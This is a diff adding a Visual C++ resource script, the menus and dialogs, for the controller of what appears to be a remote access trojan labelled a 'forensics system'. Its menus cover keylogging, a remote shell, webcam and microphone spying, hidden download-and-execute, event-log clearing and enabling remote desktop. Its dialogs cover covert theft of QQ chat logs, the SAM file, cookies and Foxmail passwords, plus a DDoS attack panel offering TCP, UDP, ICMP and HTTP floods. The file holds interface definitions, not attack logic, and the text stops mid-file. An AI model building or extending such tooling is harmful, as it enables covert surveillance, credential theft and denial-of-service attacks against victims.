@@ -1,0 +1,803 @@
+// Microsoft Visual C++ generated resource script.
+//
+#include "resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "afxres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// Chinese (P.R.C.) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)
+#ifdef _WIN32
+LANGUAGE LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED
+#pragma code_page(936)
+#endif //_WIN32
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE 
+BEGIN
+    "resource.h\0"
+END
+
+2 TEXTINCLUDE 
+BEGIN
+    "#include ""afxres.h""\r\n"
+    "\0"
+END
+
+3 TEXTINCLUDE 
+BEGIN
+    "#define _AFX_NO_SPLITTER_RESOURCES\r\n"
+    "#define _AFX_NO_OLE_RESOURCES\r\n"
+    "#define _AFX_NO_TRACKER_RESOURCES\r\n"
+    "#define _AFX_NO_PROPERTY_RESOURCES\r\n"
+    "\r\n"
+    "#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)\r\n"
+    "#ifdef _WIN32\r\n"
+    "LANGUAGE 4, 2\r\n"
+    "#pragma code_page(936)\r\n"
+    "#endif //_WIN32\r\n"
+    "#include ""res\\TSPClient.rc2""  // non-Microsoft Visual C++ edited resources\r\n"
+    "#include ""l.chs\\afxres.rc""          // Standard components\r\n"
+    "#endif\r\n"
+    "\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Icon
+//
+
+// Icon with lowest ID value placed first to ensure application icon
+// remains consistent on all systems.
+IDR_MAINFRAME           ICON                    "res\\TSPClient.ico"
+IDI_WEBCAM              ICON                    "res\\webcam.ico"
+IDI_CMDSHELL            ICON                    "res\\cmdshell.ico"
+IDI_KEYBOARD            ICON                    "res\\keyboard.ico"
+IDI_SYSTEM              ICON                    "res\\system.ico"
+IDI_AUDIO               ICON                    "res\\audio.ico"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Menu
+//
+
+IDR_MAINFRAME MENU 
+BEGIN
+    POPUP "连接(&C)"
+    BEGIN
+        MENUITEM "设置上线密码(&P)",                  ID_APP_PWD
+        MENUITEM "退出程序(&X)",                    IDC_EXIT
+    END
+    POPUP "选项(&V)"
+    BEGIN
+        MENUITEM "更新3322域名",                    ID_GENGXIN
+        MENUITEM "状态栏(&S)",                     ID_VIEW_STATUS_BAR
+    END
+    POPUP "帮助(&H)"
+    BEGIN
+        MENUITEM "检查更新(&U)",                    ID_UPDATE
+        MENUITEM "Web服务器安装",                    ID_APP_WEB
+        MENUITEM "帮助(&H)",                      ID_APP_HELP
+    END
+END
+
+IDR_LIST MENU 
+BEGIN
+    POPUP "MENU"
+    BEGIN
+        POPUP "主机管理(&H)"
+        BEGIN
+            MENUITEM "文件管理(&F)",                    IDM_FILEMANAGER
+            MENUITEM "屏幕控制(&C)",                    IDM_SCREENSPY
+            MENUITEM "键盘记录(&K)",                    IDM_KEYBOARD
+            MENUITEM "远程终端(&T)",                    IDM_REMOTESHELL
+            MENUITEM "系统管理(&M)",                    IDM_SYSTEM
+            MENUITEM "视频查看(&V)",                    IDM_WEBCAM
+            MENUITEM "音频监听(&L)",                    IDM_AUDIO_LISTEN
+            MENUITEM "文件密取(&T)",                    IDM_SRCRET_FETCH
+            MENUITEM "更改备注(&R)",                    IDM_RENAME_REMARK
+        END
+        POPUP "主机筛选(&F)"
+        BEGIN
+            MENUITEM "选择2000主机",                    IDC_FIND2000
+            MENUITEM "选择XP主机",                      IDC_FINDXP
+            MENUITEM "选择2003主机",                    IDC_FIND2003
+            MENUITEM "选择摄头主机",                      IDC_FINDCAM
+            MENUITEM "地理位置筛选",                      IDC_FINDADDR
+        END
+        POPUP "会话管理(&S)"
+        BEGIN
+            MENUITEM "注销(&L)",                      IDM_LOGOFF
+            MENUITEM "重启(&R)",                      IDM_REBOOT
+            MENUITEM "关机(&S)",                      IDM_SHUTDOWN
+            MENUITEM SEPARATOR
+            MENUITEM "卸载(&U)",                      IDM_REMOVE
+        END
+        POPUP "其它功能(&O)"
+        BEGIN
+            MENUITEM "下载执行(&D)",                    IDM_DOWNEXEC
+            MENUITEM "下载更新(&U)",                    IDM_UPDATE_SERVER
+            MENUITEM "调用插件(&P)",                    IDC_DOWNCHAJIAN
+            POPUP "访问网址(&V)"
+            BEGIN
+                MENUITEM "隐藏(&H)",                      IDM_OPEN_URL_HIDE
+                MENUITEM "显示(&S)",                      IDM_OPEN_URL_SHOW
+            END
+            MENUITEM "清除日志(&C)",                    IDM_CLEANEVENT
+            MENUITEM "加硬盘锁(&H)",                    IDC_HIT_HARD
+            MENUITEM "开启3389(&O)",                  IDC_OPEN_3389
+        END
+        MENUITEM "断开连接(&D)",                    IDM_DISCONNECT
+        MENUITEM SEPARATOR
+        MENUITEM "选择全部(&A)",                    IDM_SELECT_ALL
+        MENUITEM "取消选择(&U)",                    IDM_UNSELECT_ALL
+        MENUITEM "打开密取",                        ID_MENU_OPENSCRET2
+    END
+END
+
+IDR_FILEMANAGER MENU 
+BEGIN
+    POPUP "FileManger"
+    BEGIN
+        MENUITEM "传输(&T)",                      IDM_TRANSFER
+        MENUITEM "重命名(&R)",                     IDM_RENAME
+        MENUITEM "删除(&D)",                      IDM_DELETE
+        MENUITEM "新建文件夹(&N)",                   IDM_NEWFOLDER
+        MENUITEM SEPARATOR
+        MENUITEM "本地打开(&O)",                    IDM_LOCAL_OPEN
+        POPUP "远程打开(&O)"
+        BEGIN
+            MENUITEM "显示运行(&S)",                    IDM_REMOTE_OPEN_SHOW
+            MENUITEM "隐藏运行(&H)",                    IDM_REMOTE_OPEN_HIDE
+        END
+        MENUITEM SEPARATOR
+        MENUITEM "刷新(&R)",                      IDM_REFRESH
+    END
+END
+
+IDR_LOCAL_VIEW MENU 
+BEGIN
+    POPUP "Lview"
+    BEGIN
+        MENUITEM "大图标",                         IDM_LOCAL_BIGICON
+        MENUITEM "小图标",                         IDM_LOCAL_SMALLICON
+        MENUITEM "列表",                          IDM_LOCAL_LIST
+        MENUITEM "详细信息",                        IDM_LOCAL_REPORT
+    END
+END
+
+IDR_REMOTE_VIEW MENU 
+BEGIN
+    POPUP "Rview"
+    BEGIN
+        MENUITEM "大图标",                         IDM_REMOTE_BIGICON
+        MENUITEM "小图标",                         IDM_REMOTE_SMALLICON
+        MENUITEM "列表",                          IDM_REMOTE_LIST
+        MENUITEM "详细信息",                        IDM_REMOTE_REPORT
+    END
+END
+
+IDR_PSLIST MENU 
+BEGIN
+    POPUP "PSLIST"
+    BEGIN
+        MENUITEM "结束(&T)",                      IDM_KILLPROCESS
+        MENUITEM "刷新(&R)",                      IDM_REFRESHPSLIST
+    END
+END
+
+IDR_MINIMIZE MENU 
+BEGIN
+    POPUP "MINIMIZE"
+    BEGIN
+        MENUITEM "隐藏",                          IDM_HIDE
+        MENUITEM "显示",                          IDM_SHOW
+        MENUITEM "退出",                          IDM_EXIT
+    END
+END
+
+IDR_REMOVELIST MENU 
+BEGIN
+    POPUP "Menu"
+    BEGIN
+        MENUITEM "卸载(&U)",                      ID_REMOVELIST
+        MENUITEM "打开密取",                        ID_MENU_OPENSCRET
+        MENUITEM "更改备注(&R)",                    IDM_RENAME_REMARK
+    END
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog
+//
+
+IDD_ABOUTBOX DIALOGEX 0, 0, 235, 65
+STYLE DS_SETFONT | DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "关于 TSP"
+FONT 9, "宋体", 0, 0, 0x0
+BEGIN
+    ICON            IDR_MAINFRAME,IDC_STATIC,11,17,20,20
+    LTEXT           "TSP取证系统",IDC_STATIC,40,20,104,8,SS_NOPREFIX
+    DEFPUSHBUTTON   "确定",IDOK,178,6,50,14,WS_GROUP
+    LTEXT           "编译时间",IDC_STATIC_BUILD,39,40,119,8
+END
+
+IDD_FILE DIALOGEX 0, 0, 358, 275
+STYLE DS_SETFONT | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME
+CAPTION "文件管理"
+FONT 9, "宋体", 0, 0, 0x1
+BEGIN
+    COMBOBOX        IDC_LOCAL_PATH,35,5,140,44,CBS_DROPDOWN | CBS_AUTOHSCROLL | CBS_SORT | WS_VSCROLL | WS_TABSTOP
+    CONTROL         "List1",IDC_LIST_LOCAL,"SysListView32",LVS_AUTOARRANGE | LVS_EDITLABELS | WS_BORDER | WS_TABSTOP,0,24,357,106,WS_EX_ACCEPTFILES
+    COMBOBOX        IDC_REMOTE_PATH,35,136,140,58,CBS_DROPDOWN | CBS_AUTOHSCROLL | CBS_SORT | WS_VSCROLL | WS_TABSTOP
+    CONTROL         "List1",IDC_LIST_REMOTE,"SysListView32",LVS_SHOWSELALWAYS | LVS_AUTOARRANGE | LVS_EDITLABELS | WS_BORDER | WS_TABSTOP,0,155,357,106
+    LTEXT           "本地",IDC_STATIC,13,7,17,8
+    LTEXT           "远程",IDC_STATIC_REMOTE,13,138,17,8
+END
+
+IDD_SETTINGS DIALOGEX 0, 0, 484, 318
+STYLE DS_SYSMODAL | DS_SETFONT | WS_CHILD
+FONT 9, "宋体", 0, 0, 0x0
+BEGIN
+    LTEXT           "最大上线数量",IDC_STATIC,321,276,49,8
+    EDITTEXT        IDC_MAX_CONNECT,385,273,22,14,ES_AUTOHSCROLL | ES_NUMBER
+    LTEXT           "static",IDC_ALERT_STATIC,31,141,342,70
+    GROUPBOX        "上线特征码",IDC_STATIC,7,40,477,83
+    LTEXT           "上线主机",IDC_STATIC,366,17,33,8,NOT WS_VISIBLE
+    EDITTEXT        IDC_REMOTE_HOST,369,18,21,12,ES_CENTER | ES_AUTOHSCROLL | NOT WS_VISIBLE
+    LTEXT           "端口",IDC_STATIC,374,16,17,8,NOT WS_VISIBLE
+    EDITTEXT        IDC_REMOTE_PORT,361,15,42,12,ES_CENTER | ES_AUTOHSCROLL | ES_NUMBER | NOT WS_VISIBLE
+    EDITTEXT        IDC_ENCODE,361,15,40,12,ES_CENTER | ES_AUTOHSCROLL | ES_READONLY | NOT WS_VISIBLE
+    GROUPBOX        "系统配置",IDC_STATIC,7,6,477,29
+    PUSHBUTTON      "应用",IDC_RESETPORT,218,15,41,14
+    LTEXT           "监听端口",IDC_STATIC,15,19,33,8
+    EDITTEXT        IDC_LISTEN_PORT,54,16,40,13,ES_CENTER | ES_AUTOHSCROLL | ES_NUMBER
+    LTEXT           "连接上限",IDC_STATIC,100,19,33,8
+    EDITTEXT        IDC_CONNECT_MAX,137,16,40,13,ES_CENTER | ES_AUTOHSCROLL | ES_NUMBER
+    CONTROL         "自动",IDC_CONNECT_AUTO,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,182,18,29,10
+    PUSHBUTTON      "测试",IDC_TEST_MASTER,363,15,41,14,NOT WS_VISIBLE
+    CONTROL         "禁用上线时气泡提示",IDC_DISABLE_POPTIPS,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,17,274,86,10
+    CONTROL         "保存当前为默认配置",IDC_SAVEAS_DEFAULT,"Button",BS_AUTOCHECKBOX | NOT WS_VISIBLE | WS_TABSTOP,363,17,29,10
+    LTEXT           "服务显示名称",IDC_STATIC,13,69,48,8
+    EDITTEXT        IDC_SerName,64,67,105,12,ES_AUTOHSCROLL
+    LTEXT           "服务描述",IDC_STATIC,175,69,33,8
+    EDITTEXT        IDC_SerMS,209,67,198,12,ES_AUTOHSCROLL
+    PUSHBUTTON      "生成",IDC_ShengCheng,345,93,54,27
+    LTEXT           "上线密码",IDC_STATIC,26,52,33,8
+    EDITTEXT        IDC_PASS,63,50,105,12,ES_CENTER | ES_PASSWORD | ES_AUTOHSCROLL
+    LTEXT           "注:上线密码不正确的时候是无法上线的!!!",IDC_STATIC,175,52,199,8
+    LTEXT           "用户名:",IDC_STATIC,26,86,28,8
+    EDITTEXT        IDC_username,64,84,105,12,ES_CENTER | ES_AUTOHSCROLL
+    LTEXT           "密码:",IDC_STATIC,180,86,24,8
+    EDITTEXT        IDC_userpass,209,84,104,12,ES_CENTER | ES_PASSWORD | ES_AUTOHSCROLL
+    CTEXT           "注:上线域名与端口在申请账户时绑定.",IDC_STATIC,25,102,137,8
+    CONTROL         "自删除",IDC_Delete,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,276,101,40,10
+    GROUPBOX        "短信报警设置",IDC_STATIC,7,125,477,132
+    LTEXT           "报警手机号:",IDC_STATIC,26,220,62,8
+    EDITTEXT        IDC_MOBILE_EDIT,95,218,98,12,ES_AUTOHSCROLL
+    PUSHBUTTON      "开启",IDC_BAOJIAN,349,219,54,27
+    LTEXT           "报警状态",IDC_BAOJIANSTATE,259,230,75,8
+    GROUPBOX        "",IDC_STATIC,247,212,158,36
+    LTEXT           "飞信密码:",IDC_STATIC,26,236,62,8
+    EDITTEXT        IDC_FETIONPWD_EDIT,96,234,98,12,ES_PASSWORD | ES_AUTOHSCROLL
+    CONTROL         "过滤未知线索项并卸载",IDC_FILTER_UNKNOWN,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,107,275,96,10
+    GROUPBOX        "杂项",IDC_STATIC,7,259,477,35
+    CONTROL         "自动选择上下线项，并可见",IDC_AUTO_SELECT_VISIBLE,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,206,275,112,10
+    COMBOBOX        IDC_COMBO2,404,100,73,138,CBS_DROPDOWNLIST | WS_VSCROLL | WS_TABSTOP
+    LTEXT           "木马用户信息选择",IDC_STATIC,408,86,65,8
+END
+
+IDD_TRANSFERMODE_DLG DIALOG  0, 0, 371, 75
+STYLE DS_SETFONT | DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "确认文件替换"
+FONT 9, "宋体"
+BEGIN
+    GROUPBOX        "",IDC_STATIC,6,2,359,66
+    LTEXT           "Tips",IDC_TIPS,13,13,342,23
+    PUSHBUTTON      "覆盖",IDC_OVERWRITE,12,42,43,14
+    PUSHBUTTON      "继传",IDC_ADDITION,113,42,43,14
+    PUSHBUTTON      "跳过",IDC_JUMP,218,42,43,14
+    PUSHBUTTON      "全部覆盖",IDC_OVERWRITE_ALL,63,42,43,14
+    PUSHBUTTON      "全部继传",IDC_ADDITION_ALL,166,42,43,14
+    PUSHBUTTON      "全部跳过",IDC_JUMP_ALL,267,42,43,14
+    PUSHBUTTON      "取消",IDC_CANCEL,316,42,43,14
+END
+
+IDD_SCREENSPY DIALOG  0, 0, 510, 330
+STYLE DS_SETFONT | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_POPUP | WS_CAPTION | WS_VSCROLL | WS_HSCROLL | WS_SYSMENU | WS_THICKFRAME
+CAPTION "Dialog"
+FONT 9, "宋体"
+BEGIN
+END
+
+IDD_WEBCAM DIALOG  0, 0, 176, 144
+STYLE DS_SETFONT | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME
+CAPTION "Dialog"
+FONT 9, "@宋体"
+BEGIN
+END
+
+IDD_KEYBOARD DIALOG  0, 0, 328, 255
+STYLE DS_SETFONT | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME
+CAPTION "键盘记录"
+FONT 9, "宋体"
+BEGIN
+    EDITTEXT        IDC_EDIT,0,0,327,255,ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | ES_WANTRETURN | WS_VSCROLL
+END
+
+IDD_SYSTEM DIALOG  0, 0, 274, 259
+STYLE DS_SETFONT | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME
+CAPTION "系统管理"
+FONT 9, "宋体"
+BEGIN
+    CONTROL         "List1",IDC_LIST_PROCESS,"SysListView32",LVS_REPORT | WS_BORDER | WS_TABSTOP,0,19,273,240
+    CONTROL         "Tab1",IDC_TAB,"SysTabControl32",TCS_HOTTRACK | TCS_BUTTONS,0,2,267,13
+    CONTROL         "List1",IDC_LIST_WINDOWS,"SysListView32",LVS_REPORT | WS_BORDER | WS_TABSTOP,0,19,273,240
+    CONTROL         "List1",IDC_LIST_DIALUPASS,"SysListView32",LVS_REPORT | WS_BORDER | WS_TABSTOP,0,19,273,240
+END
+
+IDD_SHELL DIALOG  0, 0, 439, 270
+STYLE DS_SETFONT | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME
+FONT 9, "宋体"
+BEGIN
+    EDITTEXT        IDC_EDIT,0,0,438,269,ES_MULTILINE | ES_AUTOVSCROLL | ES_AUTOHSCROLL | ES_WANTRETURN | WS_VSCROLL | WS_HSCROLL
+END
+
+IDD_AUDIO DIALOGEX 0, 0, 229, 86
+STYLE DS_SETFONT | DS_MODALFRAME | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "语音监听"
+FONT 9, "宋体", 0, 0, 0x0
+BEGIN
+    GROUPBOX        "",IDC_STATIC,9,2,213,59
+    CONTROL         "发送本地语音到远程",IDC_SEND_LOCALAUDIO,"Button",BS_AUTOCHECKBOX | WS_DISABLED,12,41,88,10
+    LTEXT           "正在监听远程声音 ......",IDC_STATIC,12,15,111,8
+    LTEXT           "Microsoft GSM 6.10 Audio CODEC",IDC_STATIC,12,28,120,8
+    LTEXT           "Receive 0 KBytes",IDC_TIPS,135,28,80,8
+    PUSHBUTTON      "录音",IDC_BTN_RECORD,142,65,38,14
+    PUSHBUTTON      "停止",IDC_BTN_STOPREC,184,65,38,14
+END
+
+IDD_DDOS DIALOGEX 0, 0, 457, 241
+STYLE DS_SETFONT | WS_CHILD
+FONT 10, "宋体", 0, 0, 0x0
+BEGIN
+    PUSHBUTTON      "开始",IDC_DdosBegin,64,190,51,14
+    LTEXT           "域名/IP",IDC_STATIC,30,122,28,8
+    EDITTEXT        IDC_URL,64,121,83,12,ES_AUTOHSCROLL
+    LTEXT           "端口",IDC_STATIC,45,138,16,8
+    EDITTEXT        IDC_PORT,64,136,25,12,ES_AUTOHSCROLL
+    LTEXT           "单次发包数",IDC_STATIC,123,138,38,8
+    EDITTEXT        IDC_FaBao,164,136,27,12,ES_AUTOHSCROLL
+    LTEXT           "发包间隔(毫秒)",IDC_STATIC,217,138,54,8
+    EDITTEXT        IDC_SLEEP,271,136,34,12,ES_AUTOHSCROLL
+    LTEXT           "CC变参",IDC_STATIC,37,153,23,8
+    EDITTEXT        IDC_BIANCAN1,64,151,25,12,ES_AUTOHSCROLL
+    LTEXT           "到",IDC_STATIC,92,152,9,8
+    EDITTEXT        IDC_BIANCAN2,102,151,25,12,ES_AUTOHSCROLL
+    EDITTEXT        IDC_COOKIE,429,17,21,12,ES_AUTOHSCROLL | NOT WS_VISIBLE
+    LTEXT           "攻击线程",IDC_STATIC,31,168,30,8
+    EDITTEXT        IDC_Thread,64,166,38,12,ES_AUTOHSCROLL
+    LTEXT           "攻击时间(分)",IDC_STATIC,107,168,46,8
+    EDITTEXT        IDC_ATTACKTIME,154,166,29,12,ES_AUTOHSCROLL
+    PUSHBUTTON      "停止",IDC_DDOS_STOP,144,190,51,14
+    LTEXT           "[流量模式]\n\n适用于PC/网吧/路由/部分网站",IDC_STATIC,7,17,156,25
+    LTEXT           "[网站模式] \n\n适用于WEB站点,对于PC/网吧/路由是无效的.",IDC_STATIC,186,17,221,25
+    LTEXT           "请求页面",IDC_STATIC,151,122,32,8
+    EDITTEXT        IDC_GETPAGE,183,120,105,12,ES_AUTOHSCROLL
+    LTEXT           "注:0为不限制时间.",IDC_STATIC,187,168,66,8
+    LTEXT           "使用此方式时注意变参,否则和普通的GET没区别",IDC_STATIC,248,70,161,9
+    LTEXT           "注:CC时参数用%d代替,变参在下面设置.",IDC_STATIC,290,122,134,8
+    CONTROL         "TCP  测试",IDC_RADIO1,"Button",BS_AUTORADIOBUTTON,10,46,51,10
+    CONTROL         "UDP  测试",IDC_RADIO2,"Button",BS_AUTORADIOBUTTON,10,69,51,10
+    CONTROL         "HTTP GET",IDC_RADIO3,"Button",BS_AUTORADIOBUTTON,186,46,48,10
+    CONTROL         "特殊 Get (CC)",IDC_RADIO4,"Button",BS_AUTORADIOBUTTON,186,69,63,10
+    CONTROL         "ICMP 测试 (Ping)",IDC_RADIO5,"Button",BS_AUTORADIOBUTTON,10,92,79,10
+    LTEXT           "需要确定对方端口.测试对方最大连接数.",IDC_STATIC,21,56,135,8
+    LTEXT           "不需要端口,用于测试对方带宽大小.",IDC_STATIC,21,79,120,8
+    LTEXT           "不需要端口,同样测试对方带宽.",IDC_STATIC,21,102,106,8
+    LTEXT           "测试对方处理Get请求的能力.",IDC_STATIC,196,56,99,8
+    LTEXT           "测试对方处理Get请求后与数据库交互的能力.",IDC_STATIC,196,80,151,8
+    GROUPBOX        "DDOS攻击",IDC_STATIC,7,7,420,203
+END
+
+IDD_LOGIN DIALOGEX 0, 0, 251, 166
+STYLE DS_SETFONT | DS_MODALFRAME | DS_3DLOOK | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "VIP登录"
+FONT 10, "宋体", 0, 0, 0x0
+BEGIN
+    EDITTEXT        IDC_username,69,98,82,12,ES_CENTER | ES_AUTOHSCROLL
+    EDITTEXT        IDC_userpass,69,115,82,12,ES_CENTER | ES_PASSWORD | ES_AUTOHSCROLL
+    DEFPUSHBUTTON   "登录",IDC_LOGIN,69,146,33,16
+    PUSHBUTTON      "退出",IDC_EXIT,118,146,33,16
+    LTEXT           "用户名:",IDC_STATIC,37,100,27,8
+    LTEXT           "密码:",IDC_STATIC,44,117,20,8
+    CONTROL         "保存用户名/密码",IDC_CHECK1,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,158,116,72,10
+    EDITTEXT        IDC_POINTEDIT,0,0,251,95,ES_MULTILINE | ES_AUTOVSCROLL | ES_AUTOHSCROLL | ES_READONLY | NOT WS_BORDER | WS_VSCROLL,WS_EX_TRANSPARENT
+END
+
+IDD_GENGXIN DIALOG  0, 0, 187, 151
+STYLE DS_SETFONT | DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "更新3322域名"
+FONT 10, "宋体"
+BEGIN
+    PUSHBUTTON      "开始更新",IDC_BUTTON1,62,111,62,22
+    EDITTEXT        IDC_DNSID,58,24,89,12,ES_AUTOHSCROLL
+    LTEXT           "用户名:",IDC_STATIC,31,25,27,8
+    LTEXT           "密码:",IDC_STATIC,38,42,20,8
+    LTEXT           "域名:",IDC_STATIC,37,57,20,8
+    LTEXT           "IP地址:",IDC_STATIC,29,74,28,8
+    EDITTEXT        IDC_DNSPASS,58,40,89,12,ES_PASSWORD | ES_AUTOHSCROLL
+    EDITTEXT        IDC_DNS,58,56,89,12,ES_AUTOHSCROLL
+    EDITTEXT        IDC_IP,58,72,89,12,ES_AUTOHSCROLL
+END
+
+IDD_GUANYU DIALOGEX 0, 0, 459, 233
+STYLE DS_SETFONT | WS_CHILD
+FONT 10, "宋体", 0, 0, 0x0
+BEGIN
+    LTEXT           "Static",IDC_GUANYU,7,7,445,219
+END
+
+IDD_DLG_PROGRESS DIALOGEX 0, 0, 385, 193
+STYLE DS_SETFONT | DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "下载进度"
+FONT 9, "宋体", 400, 0, 0x0
+BEGIN
+    CONTROL         "",IDC_PROGRESS1,"msctls_progress32",WS_BORDER,7,163,371,14
+    GROUPBOX        "更新信息",IDC_STATIC,7,7,371,153
+    EDITTEXT        IDC_EDIT_UNDATAINFO,15,17,363,140,ES_MULTILINE | ES_AUTOVSCROLL | ES_AUTOHSCROLL | WS_VSCROLL | WS_HSCROLL
+END
+
+IDD_DLGSECRET_GET DIALOGEX 0, 0, 266, 212
+STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "密取"
+FONT 8, "MS Shell Dlg", 400, 0, 0x1
+BEGIN
+    DEFPUSHBUTTON   "设置",ID_BTN_START,174,190,42,14
+    PUSHBUTTON      "打开密取",ID_BTN_STOP,217,190,42,14
+    CONTROL         "自动获取最近打开的文件",IDC_CHK_RECET,"Button",BS_AUTOCHECKBOX | WS_DISABLED | WS_TABSTOP,15,18,99,10
+    CONTROL         "自动获取QQ聊天记录",IDC_CHKQQLOG,"Button",BS_AUTOCHECKBOX | WS_DISABLED | WS_TABSTOP,15,86,136,10
+    CONTROL         "自动获取统帐号SAM文件",IDC_CHKLOGINPASS,"Button",BS_AUTOCHECKBOX | WS_DISABLED | WS_TABSTOP,133,19,102,10
+    CONTROL         "自动获取web浏览记录",IDC_CHK_WEB,"Button",BS_AUTOCHECKBOX | WS_DISABLED | WS_TABSTOP,15,35,136,10
+    CONTROL         "自动获取Skype录音",IDC_CHK_SKYPE,"Button",BS_AUTOCHECKBOX | WS_DISABLED | WS_TABSTOP,15,52,136,10
+    LTEXT           "",IDC_STATIC_STATE,18,194,86,10
+    CONTROL         "自动获取截屏图片",IDC_CHKSCREEN,"Button",BS_AUTOCHECKBOX | WS_DISABLED | WS_TABSTOP,15,69,78,10
+    EDITTEXT        IDC_SCRTIME,139,69,30,12,ES_AUTOHSCROLL | ES_NUMBER | WS_DISABLED
+    COMBOBOX        IDC_COMBO_SCRBIT,201,69,48,52,CBS_DROPDOWNLIST | WS_DISABLED | WS_VSCROLL | WS_TABSTOP
+    LTEXT           "间隔(秒)",IDC_STATIC,105,73,32,8
+    LTEXT           "色深",IDC_STATIC,182,73,19,8
+    CONTROL         "获取Cookies信息",IDC_CHKCOOKIES,"Button",BS_AUTOCHECKBOX | WS_DISABLED | WS_TABSTOP,15,103,136,10
+    CONTROL         "获取foxmail帐户密码",IDC_CHKFOXMAIL,"Button",BS_AUTOCHECKBOX | WS_DISABLED | WS_TABSTOP,15,119,188,10
+    DEFPUSHBUTTON   "重置",ID_BTN_RESET,128,190,42,14
+    CONTROL         "触景截屏（键盘输入、突防工具和HTTPS页面截屏）",IDC_CHKCLEVERSRC,"Button",BS_AUTOCHECKBOX | WS_DISABLED | WS_TABSTOP,15,135,188,10
+    PUSHBUTTON      "上传插件",IDC_BTN_UPPLUGSRC,208,133,51,14,NOT WS_VISIBLE | WS_DISABLED
+    CONTROL         "键盘输入截屏",IDC_CHKALARMSRC_LIUSHUI,"Button",BS_AUTOCHECKBOX | NOT WS_VISIBLE | WS_DISABLED | WS_TABSTOP,32,148,188,10
+    CONTROL         "图防工具截屏",IDC_CHKALARMSRC_MINGAN,"Button",BS_AUTOCHECKBOX | NOT WS_VISIBLE | WS_DISABLED | WS_TABSTOP,32,161,188,10
+    CONTROL         "HTTPS页面或IE代理截屏",IDC_CHKALARMSRC_GUANZHU,"Button",BS_AUTOCHECKBOX | NOT WS_VISIBLE | WS_DISABLED | WS_TABSTOP,32,174,188,10
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Version
+//
+
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION 3,8,2,1
+ PRODUCTVERSION 1,5,0,0
+ FILEFLAGSMASK 0x3fL
+#ifdef _DEBUG
+ FILEFLAGS 0x9L
+#else
+ FILEFLAGS 0x8L
+#endif
+ FILEOS 0x4L
+ FILETYPE 0x1L
+ FILESUBTYPE 0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "080404b0"
+        BEGIN
+            VALUE "FileDescription", "TSP取证系统"
+            VALUE "FileVersion", "3, 8, 2, 1"
+            VALUE "InternalName", "TSP"
+            VALUE "LegalCopyright", "版权所有 (C)"
+            VALUE "OriginalFilename", "TSPClient.exe"
+            VALUE "PrivateBuild", "20111031"
+            VALUE "ProductName", "TSP取证系统"
+            VALUE "ProductVersion", "1, 5, 0, 0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x804, 1200
+    END
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// DESIGNINFO
+//
+
+#ifdef APSTUDIO_INVOKED
+GUIDELINES DESIGNINFO 
+BEGIN
+    IDD_ABOUTBOX, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 228
+        TOPMARGIN, 6
+        BOTTOMMARGIN, 58
+    END
+
+    IDD_FILE, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 351
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 268
+    END
+
+    IDD_SETTINGS, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        TOPMARGIN, 6
+        BOTTOMMARGIN, 311
+    END
+
+    IDD_TRANSFERMODE_DLG, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 364
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 67
+    END
+
+    IDD_SCREENSPY, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 492
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 312
+    END
+
+    IDD_WEBCAM, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 169
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 137
+    END
+
+    IDD_KEYBOARD, DIALOG
